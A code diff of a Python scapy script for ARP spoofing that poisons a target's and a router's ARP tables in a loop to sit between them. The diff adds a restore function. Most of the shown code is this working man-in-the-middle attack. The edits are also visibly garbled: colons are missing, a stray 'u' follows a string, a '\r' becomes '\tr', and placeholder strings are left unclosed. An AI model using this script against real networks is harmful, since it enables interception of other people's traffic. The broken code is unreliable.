@@ -18,16 +18,23 @@ def spoof(target_ip,spoof_ip)
     packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
+def restore(destination_ip,source_ip)
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2,pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    print(packet.show())
+    print(packet.summary())
+
 sent_packets_count = 0
 
 try:
 
 	while True:
 	      
-	    spoof("<ip address of target","<ip address of router")
+	    spoof("<ip address of target","<ip address of router")u
 	    spoof("<ip address of router","<ip address of target")
 	    sent_packets_count = sent_packets_count +2
-	    print("\r [+]packets sent:" + str(sent_packets_count)),
+	    print("\tr [+]packets sent:" + str(sent_packets_count)),
 	    sys.stdout.flush()
 	    time.sleep(2)
 
